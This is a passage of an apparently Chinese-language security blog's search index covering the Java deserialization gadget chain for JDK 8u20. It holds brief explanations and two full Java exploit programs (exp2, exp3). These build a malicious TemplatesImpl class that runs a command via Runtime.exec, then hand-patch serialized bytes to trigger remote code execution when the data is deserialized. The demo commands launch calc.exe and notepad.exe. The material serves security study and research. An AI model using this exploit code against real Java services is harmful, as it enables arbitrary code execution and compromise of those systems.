\u6210\u5458\u7684\u503c\u4e3a\u5f53\u524d\u5bf9\u8c61: \u7531\u4e8e BeanContextChildSupport \u5bf9\u8c61\u5df2\u7ecf\u51fa\u73b0\u8fc7\u4e86,\u8fd9\u91cc\u76f4\u63a5\u8fdb\u884c TC_REFERENCE \u5f15\u7528\u5bf9\u5e94\u7684 Handle 5. \u63d2\u5165\u975e\u6cd5\u7684 AnnotationInvocationHandler \u5bf9\u8c61\u3002\u524d\u9762\u5206\u6790\u8fc7\u5728 readChildren \u65b9\u6cd5\u4e2d\u4f1a\u518d\u6b21\u8fdb\u884c ois.readObject() \uff0c\u56e0\u6b64\u4f1a\u5c06\u6b64\u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u5e76\u4e14\u6355\u6349\u5f02\u5e38\uff0c\u4ea7\u751f\u4e00\u4e2aHandle 6. \u8d4b\u503c h \u6210\u5458\u7684\u503c\uff0c\u8fd9\u91cc\u4f7f\u7528 TC_REFERENCE \u5f15\u7528\u5230\u521a\u521a\u4ea7\u751f\u7684newHandle\u5373\u53ef\uff0c\u9700\u8981\u624b\u52a8\u8ba1\u7b97handle\u503c","title":"exp1"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#exp2","text":"\u8fd9\u4e2aexp2\u6765\u81eafeihong\u5e08\u5085\uff0c\u901a\u8fc7\u6b63\u5e38\u53cd\u5e8f\u5217\u5316\u540e\u5bf9\u5b57\u8282\u7801\u8fdb\u884c\u7ec6\u5fae\u5730\u8c03\u6574\u6765\u6784\u9020\u7578\u5f62\u7684JDK8u20\u94fe\uff0c\u6ca1\u6709\u5229\u7528\u6210\u5458\u629b\u5f03\u673a\u5236\uff0c\u4e5f\u6bd4\u524d\u9762\u7684exp1\u7a0d\u5fae\u597d\u7406\u89e3\u4e00\u70b9 - \u53c2\u8003\u6587\u7ae0\u5728 \u4ee5\u4e00\u79cd\u66f4\u7b80\u5355\u7684\u65b9\u5f0f\u6784\u9020JRE8u20 Gadget - \u5b8c\u6574\u6e90\u7801\u5728 feihong-cs/jre8u20_gadget \u8fd9\u91cc\u6ca1\u6709\u5229\u7528\u6210\u5458\u629b\u5f03\u673a\u5236\uff0c\u800c\u662f\u5229\u7528\u5230\u4e86LinkedHashSet\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u4e00\u4e00\u53cd\u5e8f\u5217\u5316map\u4e2d\u5bf9\u8c61\u7684\u673a\u5236\uff0c\u5148\u5c06 BeanContextSupport \u653e\u5728\u6700\u524d\u9762\uff0c\u8ba9\u5176\u4ea7\u751f\u975e\u6cd5\u7684 AnnotationInvocationHandler \u5bf9\u8c61\u7684newHandle\uff0c\u540e\u7eed\u518d\u6b63\u5e38\u5730\u6267\u884cJDK7u21\uff0c\u6574\u4e2a\u94fe\u7684\u6784\u9020\u903b\u8f91\u5927\u6982\u5982\u4e0b: \u5728\u8fdb\u884c\u5e8f\u5217\u5316\u7684\u65f6\u5019\uff0c\u5411\u5e8f\u5217\u5316\u6d41\u4e2d\u5199\u5165\u4e86 4 \u4e2a\u5bf9\u8c61\uff0c\u4f46\u662f\u901a\u8fc7\u4fee\u6539\u5e8f\u5217\u5316\u4e2d\u7684\u4e00\u4e9b\u7279\u6b8a\u7684 byte \uff0c\u6784\u9020\u4e86\u4e00\u4e2a\u6211\u4eec\u60f3\u8981\u7684\u5e8f\u5217\u5316\u6d41\u3002\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\uff0c LinkedHashSet \u8bfb\u5230\u7684 size \u4e3a 3 ,\u5728\u53cd\u5e8f\u5217\u5316\u7b2c\u4e00\u4e2a\u5bf9\u8c61 BeanContextSupport \u7684\u65f6\u5019\uff0c\u4f1a\u8fdb\u5165\u5230 BeanContextSupport \u7684 readChildren \u903b\u8f91\uff0c\u6210\u529f\u5c06 AnnotationInvocationHander \u8fdb\u884c\u4e86\u8fd8\u539f\uff08\u867d\u7136 AnnotationInvocationHander \u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u4f46\u662f BeanContextSupport \u6355\u6349\u4e86\u5f02\u5e38\uff09\u3002\u968f\u540e LinkedHashSet \u5728\u53cd\u5e8f\u5217\u5316\u7b2c\u4e8c\u4e2a\u548c\u4e09\u4e2a\u5143\u7d20\u7684\u65f6\u5019\uff0c\u4f1a\u53d1\u751f\u54c8\u5e0c\u78b0\u649e\uff0c\u4ece\u800c\u5bfc\u81f4 RCE \u3002 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; import javassist.ClassClassPath ; import javassist.ClassPool ; import javassist.CtClass ; import javax.xml.transform.Templates ; import java.beans.beancontext.BeanContextSupport ; import java.io.* ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Proxy ; import java.util.HashMap ; import java.util.HashSet ; import java.util.LinkedHashSet ; import java.util.Map ; public class jdk8u20EXP { public static TemplatesImpl generateEvilTemplates () throws Exception { ClassPool pool = ClassPool . getDefault (); pool . insertClassPath ( new ClassClassPath ( AbstractTranslet . class )); CtClass cc = pool . makeClass ( \"Cat\" ); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\" ; // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( cmd ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); cc . setSuperclass ( pool . get ( AbstractTranslet . class . getName ())); // \u8f6c\u6362\u4e3abytes byte [] classBytes = cc . toBytecode (); byte [][] targetByteCodes = new byte [][] { classBytes }; TemplatesImpl templates = TemplatesImpl . class . newInstance (); setFieldValue ( templates , \"_bytecodes\" , targetByteCodes ); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue ( templates , \"_name\" , \"name\" + System . nanoTime ()); setFieldValue ( templates , \"_class\" , null ); setFieldValue ( templates , \"_tfactory\" , new TransformerFactoryImpl ()); return templates ; } public static void main ( String [] args ) throws Exception { // jdk 7u21 TemplatesImpl templates = generateEvilTemplates (); HashMap map = new HashMap (); map . put ( \"f5a5a608\" , \"zero\" ); Constructor handlerConstructor = Class . forName ( \"sun.reflect.annotation.AnnotationInvocationHandler\" ). getDeclaredConstructor ( Class . class , Map . class ); handlerConstructor . setAccessible ( true ); InvocationHandler tempHandler = ( InvocationHandler ) handlerConstructor . newInstance ( Templates . class , map ); // \u4e3atempHandler\u521b\u9020\u4e00\u5c42\u4ee3\u7406 Templates proxy = ( Templates ) Proxy . newProxyInstance ( jdk7u21 . class . getClassLoader (), new Class [] { Templates . class }, tempHandler ); // \u5b9e\u4f8b\u5316HashSet\uff0c\u5e76\u5c06\u4e24\u4e2a\u5bf9\u8c61\u653e\u8fdb\u53bb HashSet set = new LinkedHashSet (); // \u5c06\u6076\u610ftemplates\u8bbe\u7f6e\u5230map\u4e2d map . put ( \"f5a5a608\" , templates ); // jdk7u21 end BeanContextSupport bcs = new BeanContextSupport (); Class cc = Class . forName ( \"java.beans.beancontext.BeanContextSupport\" ); Field beanContextChildPeer = cc . getSuperclass (). getDeclaredField ( \"beanContextChildPeer\" ); beanContextChildPeer . set ( bcs , bcs ); set . add ( bcs ); //\u5e8f\u5217\u5316 ByteArrayOutputStream baous = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( baous ); oos . writeObject ( set ); oos . writeObject ( tempHandler ); oos . writeObject ( templates ); oos . writeObject ( proxy ); oos . close (); byte [] bytes = baous . toByteArray (); System . out . println ( \"[+] Modify HashSet size from 1 to 3\" ); bytes [ 89 ] = 3 ; //\u4fee\u6539hashset\u7684\u957f\u5ea6\uff08\u5143\u7d20\u4e2a\u6570\uff09 //\u8c03\u6574 TC_ENDBLOCKDATA \u6807\u8bb0\u7684\u4f4d\u7f6e\uff0c\u5148\u6682\u65f6\u5220\u9664 //0x73 = 115, 0x78 = 120 //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 0 && bytes [ i + 1 ] == 0 && bytes [ i + 2 ] == 0 & bytes [ i + 3 ] == 0 && bytes [ i + 4 ] == 120 && bytes [ i + 5 ] == 120 && bytes [ i + 6 ] == 115 ){ System . out . println ( \"[+] Delete TC_ENDBLOCKDATA at the end of HashSet\" ); bytes = Util . deleteAt ( bytes , i + 5 ); break ; } } //\u5c06 serializable \u7684\u503c\u4fee\u6539\u4e3a 1 //0x73 = 115, 0x78 = 120 //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 120 && bytes [ i + 1 ] == 0 && bytes [ i + 2 ] == 1 && bytes [ i + 3 ] == 0 && bytes [ i + 4 ] == 0 && bytes [ i + 5 ] == 0 && bytes [ i + 6 ] == 0 && bytes [ i + 7 ] == 115 ){ System . out . println ( \"[+] Modify BeanContextSupport.serializable from 0 to 1\" ); bytes [ i + 6 ] = 1 ; break ; } } /** TC_BLOCKDATA - 0x77 Length - 4 - 0x04 Contents - 0x00000000 TC_ENDBLOCKDATA - 0x78 **/ //\u628a\u8fd9\u90e8\u5206\u5185\u5bb9\u5148\u5220\u9664\uff0c\u518d\u9644\u52a0\u5230 AnnotationInvocationHandler \u4e4b\u540e //\u76ee\u7684\u662f\u8ba9 AnnotationInvocationHandler \u53d8\u6210 BeanContextSupport \u7684\u6570\u636e\u6d41 //0x77 = 119, 0x78 = 120 //0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 119 && bytes [ i + 1 ] == 4 && bytes [ i + 2 ] == 0 && bytes [ i + 3 ] == 0 && bytes [ i + 4 ] == 0 && bytes [ i + 5 ] == 0 && bytes [ i + 6 ] == 120 ){ System . out . println ( \"[+] Delete TC_BLOCKDATA...int...TC_BLOCKDATA at the End of BeanContextSupport\" ); bytes = Util . deleteAt ( bytes , i ); bytes = Util . deleteAt ( bytes , i ); bytes = Util . deleteAt ( bytes , i ); bytes = Util . deleteAt ( bytes , i ); bytes = Util . deleteAt ( bytes , i ); bytes = Util . deleteAt ( bytes , i ); bytes = Util . deleteAt ( bytes , i ); break ; } } /* serialVersionUID - 0x00 00 00 00 00 00 00 00 newHandle 0x00 7e 00 28 classDescFlags - 0x00 - fieldCount - 0 - 0x00 00 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 29 */ //0x78 = 120, 0x70 = 112 //0x78 for TC_ENDBLOCKDATA, 0x70 for TC_NULL for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 0 && bytes [ i + 1 ] == 0 && bytes [ i + 2 ] == 0 && bytes [ i + 3 ] == 0 && bytes [ i + 4 ] == 0 && bytes [ i + 5 ] == 0 && bytes [ i + 6 ] == 0 && bytes [ i + 7 ] == 0 && bytes [ i + 8 ] == 0 && bytes [ i + 9 ] == 0 && bytes [ i + 10 ] == 0 && bytes [ i + 11 ] == 120 && bytes [ i + 12 ] == 112 ){ System . out . println ( \"[+] Add back previous delte TC_BLOCKDATA...int...TC_BLOCKDATA after invocationHandler\" ); i = i + 13 ; bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x77 ); bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x04 ); bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x00 ); bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x00 ); bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x00 ); bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x00 ); bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x78 ); break ; } } //\u5c06 sun.reflect.annotation.nAnnotationInvocationHandler \u7684 classDescFlags \u7531 SC_SERIALIZABLE \u4fee\u6539\u4e3a SC_SERIALIZABLE | SC_WRITE_METHOD // //\u8fd9\u4e00\u6b65\u5176\u5b9e\u4e0d\u662f\u901a\u8fc7\u7406\u8bba\u63a8\u7b97\u51fa\u6765\u7684\uff0c\u662f\u901a\u8fc7debug \u4ee5\u53ca\u67e5\u770b pwntester\u7684 poc \u53d1\u73b0\u9700\u8981\u8fd9\u4e48\u6539 // //\u539f\u56e0\u662f\u5982\u679c\u4e0d\u8bbe\u7f6e SC_WRITE_METHOD \u6807\u5fd7\u7684\u8bdd defaultDataEd = true\uff0c\u5bfc\u81f4 BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1)) // -> count = ois.readInt(); \u62a5\u9519\uff0c\u65e0\u6cd5\u5b8c\u6210\u6574\u4e2a\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b // \u6ca1\u6709 SC_WRITE_METHOD \u6807\u8bb0\uff0c\u8ba4\u4e3a\u8fd9\u4e2a\u53cd\u5e8f\u5217\u6d41\u5230\u6b64\u5c31\u7ed3\u675f\u4e86 // \u6807\u8bb0\uff1a 7375 6e2e 7265 666c 6563 --> sun.reflect... for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 115 && bytes [ i + 1 ] == 117 && bytes [ i + 2 ] == 110 && bytes [ i + 3 ] == 46 && bytes [ i + 4 ] == 114 && bytes [ i + 5 ] == 101 && bytes [ i + 6 ] == 102 && bytes [ i + 7 ] == 108 ){ System . out . println ( \"[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -> classDescFlags from SC_SERIALIZABLE to \" + \"SC_SERIALIZABLE | SC_WRITE_METHOD\" ); i = i + 58 ; bytes [ i ] = 3 ; break ; } } //\u52a0\u56de\u4e4b\u524d\u5220\u9664\u7684 TC_BLOCKDATA\uff0c\u8868\u660e HashSet \u5230\u6b64\u7ed3\u675f System . out . println ( \"[+] Add TC_BLOCKDATA at end\" ); bytes = Util . addAtLast ( bytes , ( byte ) 0x78 ); FileOutputStream fous = new FileOutputStream ( \"jre8u20.ser\" ); fous . write ( bytes ); //\u53cd\u5e8f\u5217\u5316 FileInputStream fis = new FileInputStream ( \"jre8u20.ser\" ); ObjectInputStream ois = new ObjectInputStream ( fis ); ois . readObject (); ois . close (); } public static void setFieldValue ( Object obj , String fieldName , Object value ) throws Exception { Field field = obj . getClass (). getDeclaredField ( fieldName ); field . setAccessible ( true ); field . set ( obj , value ); } }","title":"exp2"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#exp3","text":"\u8fd9\u4e2aexp3\u6765\u81ea\u6c88\u6c89\u821f\u5e08\u5085\uff0c\u4e5f\u662f\u901a\u8fc7\u6b63\u5e38\u53cd\u5e8f\u5217\u5316\u540e\u5bf9\u5b57\u8282\u7801\u8fdb\u884c\u7ec6\u5fae\u5730\u8c03\u6574\u6765\u6784\u9020\u7578\u5f62\u7684JDK8u20\u94fe\uff0c\u662fexp2\u7684\u7b80\u5316\u7248\uff0c\u4fee\u6539\u7684\u5b57\u8282\u7801\u66f4\u5c11\uff0c\u5177\u4f53\u539f\u7406\u53ef\u4ee5\u53c2\u89c1 \u8fd9\u91cc \uff0c\u8fd9\u91cc\u6839\u636eexp2\u548c\u539f\u7406\u91cd\u5199\u4e86\u4e0bexp: import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; import javassist.ClassClassPath ; import javassist.ClassPool ; import javassist.CtClass ; import javax.xml.transform.Templates ; import java.beans.beancontext.BeanContextSupport ; import java.io.* ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Proxy ; import java.util.* ; public class jdk8u20EXP3 { public static TemplatesImpl generateEvilTemplates () throws Exception { ClassPool pool = ClassPool . getDefault (); pool . insertClassPath ( new ClassClassPath ( AbstractTranslet . class )); CtClass cc = pool . makeClass ( \"Cat\" ); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"notepad.exe\\\");\" ; // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( cmd ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); cc . setSuperclass ( pool . get ( AbstractTranslet . class . getName ())); // \u8f6c\u6362\u4e3abytes byte [] classBytes = cc . toBytecode (); byte [][] targetByteCodes = new byte [][] { classBytes }; TemplatesImpl templates = TemplatesImpl . class . newInstance (); setFieldValue ( templates , \"_bytecodes\" , targetByteCodes ); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue ( templates , \"_name\" , \"name\" + System . nanoTime ()); setFieldValue ( templates , \"_class\" , null ); setFieldValue ( templates , \"_tfactory\" , new TransformerFactoryImpl ()); return templates ; } public static void main ( String [] args ) throws Exception { // \u83b7\u53d6\u6076\u610f\u7684TemplatesImpl TemplatesImpl templates = generateEvilTemplates (); // \u65b0\u5efa2\u4e2amap\uff0c\u7b2c\u4e00\u4e2amap\u7528\u4e8e\u54c8\u5e0c\u78b0\u649e\u9020\u6210rce\uff0c\u7b2c\u4e8c\u4e2amap\u4f5c\u4e3aBeanContextSupport\u7684children HashMap map = new HashMap (); HashMap map2 = new HashMap (); // \u5148\u653e\u5165\u5047\u7684\u6570\u636e\uff0c\u9632\u6b62\u5728\u6784\u9020\u65f6\u89e6\u53d1rce map . put ( \"f5a5a608\" , \"zero\" ); // \u6784\u9020AnnotationInvocationHandler Constructor handlerConstructor = Class . forName ( \"sun.reflect.annotation.AnnotationInvocationHandler\" ). getDeclaredConstructor ( Class . class , Map . class ); handlerConstructor . setAccessible ( true ); InvocationHandler tempHandler = ( InvocationHandler ) handlerConstructor . newInstance ( Templates . class , map ); // \u4e3atempHandler\u521b\u9020\u4e00\u5c42\u4ee3\u7406 Templates proxy = ( Templates ) Proxy . newProxyInstance ( jdk7u21 . class . getClassLoader (), new Class [] { Templates . class }, tempHandler ); // \u5b9e\u4f8b\u5316HashSet HashSet set = new LinkedHashSet (); BeanContextSupport bcs = new BeanContextSupport (); bcs . beanContextChildPeer = bcs ; setFieldValue ( bcs , \"serializable\" , 1 ); setFieldValue ( bcs , \"children\" , map2 ); // map2\u5c06tempHandler\u653e\u5165\uff0c\u8fdb\u5165readChildren\u7684try-catch-readObject\u4e2d map2 . put ( tempHandler , null ); // \u5148\u5b58\u653ebcs\uff0c\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u5148\u53cd\u5e8f\u5217\u5316bcs,\u4ece\u800c\u7559\u4e0b\u6076\u610fAnnotationInvocationHandler\u7684Handle set . add ( bcs ); set . add ( templates ); // \u540e\u7eedproxy\u76f4\u63a5\u5f15\u7528\u4e86\u524d\u9762\u7684\u6076\u610fHandle set . add ( proxy ); // \u5c06\u771f\u6b63\u7684templates\u653e\u5165map\u4e2d\u7528\u4e8e\u54c8\u5e0c\u78b0\u649e map . put ( \"f5a5a608\" , templates ); //\u5e8f\u5217\u5316 ByteArrayOutputStream baous = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( baous ); oos . writeObject ( set ); oos . close (); byte [] bytes = baous . toByteArray (); //\u5c06 sun.reflect.annotation.nAnnotationInvocationHandler \u7684 classDescFlags \u7531 SC_SERIALIZABLE \u4fee\u6539\u4e3a SC_SERIALIZABLE | SC_WRITE_METHOD // //\u8fd9\u4e00\u6b65\u5176\u5b9e\u4e0d\u662f\u901a\u8fc7\u7406\u8bba\u63a8\u7b97\u51fa\u6765\u7684\uff0c\u662f\u901a\u8fc7debug \u4ee5\u53ca\u67e5\u770b pwntester\u7684 poc \u53d1\u73b0\u9700\u8981\u8fd9\u4e48\u6539 // //\u539f\u56e0\u662f\u5982\u679c\u4e0d\u8bbe\u7f6e SC_WRITE_METHOD \u6807\u5fd7\u7684\u8bdd defaultDataEd = true\uff0c\u5bfc\u81f4 BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1)) // -> count = ois.readInt(); \u62a5\u9519\uff0c\u65e0\u6cd5\u5b8c\u6210\u6574\u4e2a\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b // \u6ca1\u6709 SC_WRITE_METHOD \u6807\u8bb0\uff0c\u8ba4\u4e3a\u8fd9\u4e2a\u53cd\u5e8f\u5217\u6d41\u5230\u6b64\u5c31\u7ed3\u675f\u4e86 // \u6807\u8bb0\uff1a 7375 6e2e 7265 666c 6563 --> sun.reflect... for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 115 && bytes [ i + 1 ] == 117 && bytes [ i + 2 ] == 110 && bytes [ i + 3 ] == 46 && bytes [ i + 4 ] == 114 && bytes [ i + 5 ] == 101 && bytes [ i + 6 ] == 102 && bytes [ i + 7 ] == 108 ){ System . out . println ( \"[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -> classDescFlags from SC_SERIALIZABLE to \" + \"SC_SERIALIZABLE | SC_WRITE_METHOD\" ); i = i + 58 ; bytes [ i ] = 3 ; break ; } } // \u8fd0\u884c\u5230BeanContextSupport.deserialize()\u4e2d\u6b64\u65f6ois.readInt()\u65f6\u9762\u5bf9\u7684\u5e8f\u5217\u5316\u6570\u636e\u53ef\u80fd\u662f\u4e2aTC_OBJECT\u6216\u8005TC_NULL\uff0c\u4e3a\u4e86\u8ba9\u653b\u51fb\u987a\u5229\uff0c\u5fc5\u987b\u8ba9ois.readInt()\u9762\u5bf9\u7684\u5e8f\u5217\u5316\u6570\u636e\u662fTC_BLOCKDATA\u5305\u88f9\u7684\u6574\u578b\u53d8\u91cf0 // 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78 -> // 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x70, 0x78 for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 0x70 && bytes [ i + 1 ] == 0x77 && bytes [ i + 2 ] == 0x04 && bytes [ i + 3 ] == 0x00 && bytes [ i + 4 ] == 0x00 && bytes [ i + 5 ] == 0x00 && bytes [ i + 6 ] == 0x00 && bytes [ i + 7 ] == 0x78 ){ System . out . println ( \"[+] Change 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78 -> 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x70, 0x78\" ); bytes [ i ] = 0x77 ; bytes [ i + 1 ] = 0x04 ; bytes [ i + 2 ] = 0x00 ; bytes [ i + 6 ] = 0x70 ; break ; } } // \u5e8f\u5217\u5316 FileOutputStream fous = new FileOutputStream ( \"jre8u20.ser\" ); fous . write ( bytes ); // \u53cd\u5e8f\u5217\u5316 FileInputStream fis = new FileInputStream ( \"jre8u20.ser\" ); ObjectInputStream ois = new ObjectInputStream ( fis ); ois . readObject (); ois . close (); } public static void setFieldValue ( Object obj , String fieldName , Object value ) throws Exception { Field field = obj . getClass (). getDeclaredField ( fieldName ); field . setAccessible ( true ); field . set ( obj , value ); } }","title":"exp3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#\u56f0\u60d1\u4e0e\u89e3\u60d1","text":"","title":"\u56f0\u60d1\u4e0e\u89e3\u60d1"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#\u56f0\u60d11","text":"exp3\u91cc\u6709\u8fd9\u4e48\u4e00\u6bb5: //\u5c06 sun.reflect.annotation.nAnnotationInvocationHandler \u7684 classDescFlags \u7531 SC_SERIALIZABLE \u4fee\u6539\u4e3a SC_SERIALIZABLE | SC_WRITE_METHOD // //\u8fd9\u4e00\u6b65\u5176\u5b9e\u4e0d\u662f\u901a\u8fc7\u7406\u8bba\u63a8\u7b97\u51fa\u6765\u7684\uff0c\u662f\u901a\u8fc7debug \u4ee5\u53ca\u67e5\u770b pwntester\u7684 poc \u53d1\u73b0\u9700\u8981\u8fd9\u4e48\u6539 // //\u539f\u56e0\u662f\u5982\u679c\u4e0d\u8bbe\u7f6e SC_WRITE_METHOD \u6807\u5fd7\u7684\u8bdd defaultDataEd = true\uff0c\u5bfc\u81f4 BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1)) // -> count = ois.readInt(); \u62a5\u9519\uff0c\u65e0\u6cd5\u5b8c\u6210\u6574\u4e2a\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b // \u6ca1\u6709 SC_WRITE_METHOD \u6807\u8bb0\uff0c\u8ba4\u4e3a\u8fd9\u4e2a\u53cd\u5e8f\u5217\u6d41\u5230\u6b64\u5c31\u7ed3\u675f\u4e86 // \u6807\u8bb0\uff1a 7375 6e2e 7265 666c 6563 --> sun.reflect... for(int i = 0; i < bytes.length; i++){ if(bytes[i] == 115 && bytes[i+1] == 117 && bytes[i+2] == 110 && bytes[i+3] == 46 && bytes[i + 4] == 114 && bytes[i+5] == 101 && bytes[i+6] == 102 && bytes[i+7] == 108 ){ System.out.println(\"[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -> classDescFlags from SC_SERIALIZABLE to \" + \"SC_SERIALIZABLE | SC_WRITE_METHOD\"); i = i + 58; bytes[i] = 3; break; } } \u8fd9\u91cc\u5c06 AnnotationInvocationHandler \u7684 classDescFlags \u6dfb\u52a0\u4e86 SC_WRITE_METHOD \u8fd9\u4e2a\u6807\u5fd7\uff0c\u8fd9\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f \u6211\u4eec\u5728 BeanContextSupport#readChildren \u5904\u6253\u4e0b\u65ad\u70b9\uff0c\u67e5\u770b\u8c03\u7528\u6808: \u8fd9\u91cc\u6709\u4e00\u4e2a readSerialData \uff0c\u8ddf\u8fdb\u4ee3\u7801: \u73b0\u5728\u4ee3\u7801\u8d70\u5230\u4e86 slotDesc.invokeReadObject \u5904\uff0c\u800c\u7531\u4e8e\u6211\u4eec\u53cd\u5e8f\u5217\u5316\u4ea7\u751f\u5e76\u6355\u6349\u4e86\u5f02\u5e38\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e2d\u540e\u7eed\u7684\u4ee3\u7801\u5c06\u4e0d\u518d\u6267\u884c\uff0c\u5373\u540e\u7eed\u4e0d\u4f1a\u518d\u8bbe\u7f6e defaultDataEnd = _false_``; \uff0c\u90a3\u4e48\u8fd9\u4e2adefaultDataEnd\u662f\u7528\u6765\u505a\u4ec0\u4e48\u7684\u5462\uff1f \u5f53\u6210\u5458\u5757\u7ed3\u675f\u4f46\u6ca1\u6709TC_ENDBLOCKDATA\u65f6\u5176\u4f1a\u88ab\u8bbe\u7f6e\u4e3aTrue\u3002 \u5f53\u6211\u4eec\u628a\u4e0a\u9762\u90a3\u6bb5\u4fee\u6539\u6807\u5fd7\u7684\u4ee3\u7801\u6ce8\u91ca\u540e\u518d\u8fdb\u884c\u8c03\u8bd5: \u5176\u4f1a\u8bbe\u7f6e defaultDataEnd=True \uff0c\u7531\u4e8e\u5f02\u5e38\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u540e\u7eed\u8bbe\u7f6e defaultDataEnd=False \u7684\u4ee3\u7801\u88ab\u8df3\u8fc7\u4e86\u3002\u6211\u4eec\u770b\u770b\u540e\u7eed ois.readInt() \uff0c\u4e00\u76f4\u8ddf\u8fdb\u5230 DataInputStream#readInt \u4e2d: \u7ee7\u7eed\u8ddf\u8fdb in.read() : \u8ddf\u8fdb refill() : \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u8fd4\u56de\u4e86-1\uff0c\u4e00\u76f4\u56de\u6eaf\u8fc7\u53bb\uff0c\u5bfc\u81f44\u4e2a in.read() \u90fd\u4f1a\u8fd4\u56de-1\uff0c\u629b\u51fa EOFException \u3002 \u8fd9\u91cc\u4f7f\u7528\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\u5c06 AnnotationInvocationHandler \u7684 classDescFlags \u6dfb\u52a0\u4e86 SC_WRITE_METHOD \u6807\u5fd7\uff0c\u8fd9\u6837\u5c31\u4e0d\u4f1a\u8fdb\u5165if\u5224\u65ad\u4e2d\uff0c\u4e00\u5f00\u59cb\u5c31\u4e0d\u4f1a\u5c06 defaultDataEnd=True \uff0c\u4e5f\u5c31\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u4f7f\u5f97 ois.readInt() \u80fd\u591f\u6709\u673a\u4f1a\u8bfb\u53d6\u5230Int\u3002","title":"\u56f0\u60d11"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#\u56f0\u60d12","text":"exp3\u91cc\u6709\u8fd9\u4e48\u4e00\u6bb5: // 